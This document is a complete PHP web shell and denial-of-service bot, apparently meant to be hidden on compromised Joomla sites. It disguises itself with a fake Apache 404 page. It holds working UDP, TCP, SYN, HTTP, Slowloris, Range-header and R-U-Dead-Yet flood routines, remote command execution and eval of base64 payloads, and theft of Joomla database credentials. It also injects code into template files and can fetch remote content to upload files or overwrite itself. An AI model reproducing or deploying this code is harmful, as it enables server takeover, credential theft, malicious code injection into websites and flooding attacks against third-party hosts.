<?php 
@ignore_user_abort(TRUE);
@set_time_limit(0);
@ini_set('log_errors',0);
@error_reporting(E_ERROR | E_WARNING);
@ini_set('display_errors', 1);

$version = 3.5;

$action = $_REQUEST['action'];
$host = $_REQUEST['host'];
$port = $_REQUEST['port']?$_REQUEST['port']:80	;
$time = $_REQUEST['time']?$_REQUEST['time']:60;
$flood = null;
$_REQUEST['url'] = urldecode($_REQUEST['url']);

switch(strtolower($action)) {
    case "version":
	case 'info':
		$flood = new Flooding("udp://1.1.1.1", 80, 1);
        $flood->Flood();
        if(ini_get("open_basedir")){
        	$openbasedir = "true"; 
        }else{
        	$openbasedir = "false";
        }
        if(ini_get("safemode")){
        	$safemode = "true"; 
        }else{
        	$safemode = "false";
        }
        //Joomla Config
        $db = getJoomlaConfig();
		echo "<version>".$version."</version><br>";
		echo "<power>".$flood->packets."</power><br>";
		echo "<whoami>".exe("whoami")."</whoami><br>";
		echo "<uname>".exe("uname -a")."</uname><br>";
		echo "<software>".@getenv('SERVER_SOFTWARE')."</software><br>";
		echo "<openbasedir>".$openbasedir."</openbasedir><br>";
		echo "<safemode>".$safemode."</safemode><br>";
		echo "<dbHost>".$db['host']."</dbHost><br>";
		echo "<dbUser>".$db['user']."</dbUser><br>";
		echo "<dbName>".$db['name']."</dbDb><br>";
		echo "<dbPasswd>".$db['password']."</dbPasswd><br>";
	break;
    case "udp":
        $flood = new Flooding("udp://$host", $port, $time);
        $flood->Flood();
    break;
    case "tcp":
        $flood = new Flooding("tcp://$host", $port, $time);
        $flood->Flood();
    break;
    case "http":
        $flood = new Flooding($host, $port, $time);
        $flood->HttpFlood($_REQUEST['method'], $_REQUEST['url']);
    break;
    case "syn":
    case "ssyn":
        $flood = new Flooding("$host", $port, $time);
        $flood->Ssyn();
    break;
    case "slw":
    case "slowloris":
        $flood = new Flooding("$host", $port, $time);
        $flood->Slowloris($_REQUEST['method'], $_REQUEST['url'], $_REQUEST['sleep']);
    break;
    case "arme":
        $flood = new Flooding("$host", $port, $time);
        $flood->Arme($_REQUEST['url']);
    break;
    case 'rudy':
    	$flood = new Flooding("$host", $port, $time);
        $flood->Rudy($_REQUEST['method'], $_REQUEST['url'], $_REQUEST['postField'], $_REQUEST['length']);
    break;
	case 'exec':
		echo exe(base64_decode(urldecode($_REQUEST['exec'])));
	break;
	case 'eval':
		eval(base64_decode(urldecode($_REQUEST['eval'])));
	break;
	case 'inject':
		echo " [s][+] Starting injection...\n";
		$path = "../";
		$magic = "9k38dj5gx7";
		$injection = "";
		if($_REQUEST['magic']){
			$magic = $_REQUEST['magic'];
		}
		echo " [s][-] Magic: ".$magic."\n";
		if($_REQUEST['injection']){
			$injection = base64_decode(urldecode($_REQUEST['injection']));
		}
		echo " [s][-] Injection: ".$injection."\n";
		if($handle = opendir($path)){
		    while(false!==($template=readdir($handle))){
		        if($template!="." && $template!=".."){
		            //Index
		            $file = $path.$template."/index.php";
		            if(checkBody($file)){
		                inject($file, $injection, $magic);
		            }
	                //Layout Template
	                $file = $path.$template."/layouts/template.php";
	                if(checkBody($file)){
	                    inject($file, $injection, $magic);
	                }
	                //Layout Default
	                $file = $path.$template."/layouts/default.php";
	                if(checkBody($file)){
	                    inject($file, $injection, $magic);
	                }
		        }
		    }
		    closedir($handle);
		}
	break;
	case 'upload':
		$dir = @getcwd();
		$name = rand(100,500);
		$ext = "php";
		if($_REQUEST['content']){
			$output = base64_decode(urldecode($_REQUEST['content']));
			if(!$output){
				die(" [s][!] Error: Content is empty!");
			}
		}elseif($_REQUEST['url']){
			$_REQUEST['url'] = cleanUrl($_REQUEST['url']);
			$output = @file_get_contents($_REQUEST['url']);
			if(!$output){
				die(" [s][!] Url content is empty!");
			}
		}
		if($_REQUEST['dir']){
			$dir = $_REQUEST['dir'];
		}
		if($_REQUEST['name']){
			$name = $_REQUEST['name'];
		}
		if($_REQUEST['ext']){
			$ext = $_REQUEST['ext'];
		}
		$path = $dir."/".$name.".".$ext;
		if($output){
			if(file_put_contents($path, $output)){
				echo " [s][!] Done!\n";
				echo " [s][!] Path: ".$path;
			}else{
				echo " [s][!] Error: '".$path."'' is not writable";
			}
		}else{
			die(" [s][!] No data from content/url");
		}
	break;
	case 'copy':
		$r = copy(__FILE__, $_REQUEST['path']);
		if($r==1){
			echo " [s][!] Done!";
		}
	break;
	case 'move':
		$r = copy(__FILE__, $_REQUEST['path']);
		if($r==1){
			unlink(__FILE__);
			echo " [s][!] Done!";
		}
	break;
	case 'remove':
		unlink($_REQUEST['path']);
	break;
	case 'update':
		if($_REQUEST['content']){
			echo $_REQUEST['content']."\n";
			$output = base64_decode($_REQUEST['content']);
			echo $output."\n";
			if(!$output){
				die(" [s][!] Error: Content is empty!");
			}
		}elseif($_REQUEST['url']){
			$_REQUEST['url'] = cleanUrl($_REQUEST['url']);
			$output = @file_get_contents($_REQUEST['url']);
			if(!$output){
				die(" [s][!] Error: Url content is empty!");
			}
		}
		if($output){
			if(@file_put_contents(__FILE__, $output)){
				echo " [s][!] Done!";
			}else{
				echo " [s][!] Error: I'm not writable";
			}
		}else{
			die(" [s][!] No data from content/url");
		}
	break;
    default:
        die("<h1>Not Found</h1><p>The requested URL was not found on this server.</p>
        	<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
			<hr>
			<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips
			mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server
			at Port 80</address>");
	break;
}

if($flood && $action!="info" && $action!="version")
	echo $flood->PrintStatistics();

function cleanUrl($url){
	$url = trim(strtolower($url));
	$url = str_replace("http://","",$url);
	$url = "http://".$url;
	return $url;
}
class Flooding {
    var $handle = null; 
    var $host;
    var $port;
    var $time;
    var $seconds;
    var $packets = 0;
    var $user_agent = "";
    var $user_agents = array(
    	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
    	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17",
    	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    	"Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
    	"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
    	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
    	"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
    	);
   	var $charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    function Flooding($host, $port, $seconds = 30) {        
        $this->host = $host;
        $this->port = $port;
        $this->seconds = $seconds;
        $this->time = $seconds + time();
        $this->user_agent = $this->user_agents[rand(0, count($this->user_agents)-1)];
    }
    function Flood() {
        $packet = "";
        for($i = 0; $i < 65000; $i++) {
            $packet .= $this->charset[rand(0, strlen($this->charset))];
        }
        do {
            $this->__Connect();
            fwrite($this->handle, $packet);
            $this->__Close();            
            $this->packets++;
        }
        while($this->__CalcTime());
    }
    function Ssyn() {
    	$socks = array();
        $numsocks = 0;
        do{
			$numsocks++;
            $socks[$numsocks] = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            if (!$socks[$numsocks]) continue;
            @socket_set_nonblock($socks[$numsocks]);
            for ($j = 0; $j < 20; $j++)
                @socket_connect($socks[$numsocks], $this->host, $this->port);
        }
        while($this->__CalcTime());
    }
    function Arme($url="/"){
    	if(!$url) $url = "/";
		$range = "";
    	for ($limit=0;$limit<1300;$limit++) {
		    $range .= ",5-$limit";
		}
		$packet = "HEAD $url HTTP/1.1\r\n";
		$packet .= "Host: $this->host\r\n";
		$packet .= "Range: bytes=0-5$range\r\n";
		$packet .= "Accept-Encoding: gzip\r\n";
		$packet .= "Connection: close\r\n\r\n";
		do {           
            $this->__Connect();
            fwrite($this->handle, $packet);             
            $this->packets++;
        }
        while($this->__CalcTime());
    }
    function HttpFlood($method="GET", $url="/") {
    	$method = strtoupper($method);
    	if(!$method) $method = "GET";
    	if(!$url) $url = "/";
        $packet = "$method $url HTTP/1.1\r\n";
        $packet .= "Host: $this->host\r\n";
        $packet .= "Keep-Alive: 300\r\n";
        $packet .= "Connection: keep-alive\r\n";
        $packet .= "User-Agent: $this->user_agent\r\n\r\n";
        do {           
            $this->__Connect();
            fwrite($this->handle, $packet);             
            $this->packets++;
        }
        while($this->__CalcTime());
    }
    function Slowloris($method="GET", $url="/", $sleep=3){
    	$method = strtoupper($method);
    	if(!$method) $method = "GET";
    	if(!$url) $url = "/";
    	if(!$sleep) $sleep = 3;
    	if($method=="POST"){
    		$url = "/".md5(rand());
    	}
        //http://pastebin.com/BLEM4v0f
	    $packet = "$method $url HTTP/1.1\r\n";
	    $packet .= "Host: $this->host\r\n";
	    $packet .= "User-Agent: $this->user_agent\r\n";
	    $packet .= "Keep-Alive: 900\r\n";
	    if(($method)=="POST"){
	    	$packet .= "Content-Length: 1000000000\r\n";
	    }else{
	    	$packet .= "Content-Length: ".rand(1, 10000)."\r\n";
	    }
	    $packet .= "Accept: */*\r\n";
	    if($method=="POST"){
        	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
        }else{
        	$packet .= "X-a: ".rand(1, 10000)."\r\n";
        }
	    $this->__Connect();
	    fwrite($this->handle, $packet);
	    echo "First packet sent<br>";
	    do{
	    	if($method=="POST"){
	    		$data = ".";
	    	}else{
	    		$data = "X-c: ".rand(1, 100000)."\r\n";
	    	}
	        if(fwrite($this->handle, $data)){
	            sleep($sleep);
	            echo "Packet sent<br>";
	        }else{
	        	echo "One get attack failed to sent<br>";
	            $this->__Connect();
	            fwrite($this->handle, $packet);
	        }
	        $this->packets++;
	    }
	    while($this->__CalcTime());
	}
	function Rudy($method="POST", $url="/", $postField="", $contentLength=0){
	    if(!$method) $method = "POST";
    	if(!$url) $url = "/";
	    if(!$contentLength) $contentLength = rand(100000, 1000000);
	    $packet = "$method $url HTTP/1.1\r\n";
	    $packet .= "Host: $this->host\r\n";
	    $packet .= "User-Agent: $this->user_agent\r\n";
	    $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
	    $packet .= "Accept-Language: en-us,en;q=0.5\r\n";
	    $packet .= "Accept-Encoding: gzip,deflate\r\n";
	    $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
	    $packet .= "Connection: keep-alive\r\n";
	    $packet .= "Keep-Alive: 900\r\n";
	    $packet .= "Content-Length: $contentLength\r\n";
	    if($postField){
	        $packet .= "$postField:";
	        for($x=0;$x<$contentLength;$x++){
	                $packet .= rand(1, 100000);
	        }
	        $packet .= "\r\n";
	    }
	    do{
	        $this->__Connect();
	        fwrite($this->handle, $packet);
	        $this->packets++;
	    }
	    while($this->__CalcTime());
	}
    function PrintStatistics() {
        return "Hit for $this->seconds seconds sending a total of $this->packets packets.";
    }
    function __Connect() {        
        $this->handle = fsockopen($this->host, $this->port, $errno, $errstr, 1);
    }
    function __Close() {
        fclose($this->handle);
    }
    function __CalcTime() {
        return (time() > $this->time ? false : true);
    }
}
function getBetween($content,$start,$end){
    $r = explode($start, $content);
    if (isset($r[1])){
        $r = explode($end, $r[1]);
        return $r[0];
    }
    return '';
}
function checkBody($file){
    if(file_exists($file)){
        $content = implode('', file($file));
        if($content){
            if(stristr($content, "</body>")){
                return 1;
            }
        }
    }
}
function inject($file, $injection="", $magic){
	echo " [s][-] Injecting file ".$file." ...";
    $content = implode('', file($file));
    if($content){
    	//oldfag
    	if(stristr($content, "/*".$magic."*/") && stristr($content, "/*/".$magic."*/")){
        	$oldcode = getBetween($content, "/*".$magic."*/", "/*/".$magic."*/");
            $content = str_replace("/*".$magic."*/".$oldcode."/*/".$magic."*/", 
            	"/*".$magic."*/".$injection."/*/".$magic."*/", $content);
            $txt = " REinjected successfuly!\n";
        //newfag
        }elseif(stristr($content, "</body>")){
            $content = str_replace("</body>", "<?php /*".$magic."*/".$injection."/*/".$magic."*/ ?></body>", $content);
            $content = str_replace("</BODY>", "<?php /*".$magic."*/".$injection."/*/".$magic."*/ ?></BODY>", $content);
            $txt = " Injected successfuly!\n";
        }else{
        	echo " Body not found\n";
        }
        //inject
        if($content){
        	if(@file_put_contents($file,$content)){
                echo $txt;
            }else{
            	echo " Cant write\n";
            }
        }else{
        	echo " Unknown error\n";	
        }
    }else{
    	echo " Empty file\n";
    }
}
function exe($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
function getJoomlaConfig(){
	$confJoomla = "../../configuration.php";
	if(file_exists($confJoomla)){
		$content = @file_get_contents($confJoomla);
		if($content){
			//Joomla 1.1
			if(strstr($content, "mosConfig_host")){
				$db['host'] = get_between($content, '$mosConfig_host = \'', "'");
				$db['user'] = get_between($content, '$mosConfig_user = \'', "'");
				$db['password'] = get_between($content, '$mosConfig_password = \'', "'");
				$db['name'] = get_between($content, '$mosConfig_db = \'', "'");
			//Joomla >1.1
			}else{
				$db['host'] = get_between($content, '$host = \'', "'");
				$db['user'] = get_between($content, '$user = \'', "'");
				$db['password'] = get_between($content, '$password = \'', "'");
				$db['name'] = get_between($content, '$db = \'', "'");
			}
		}
	}
	return $db;
}
function get_between($content,$start,$end){
    $r = explode($start, $content);
    if (isset($r[1])){
        $r = explode($end, $r[1]);
        return $r[0];
    }
    return '';
}
?>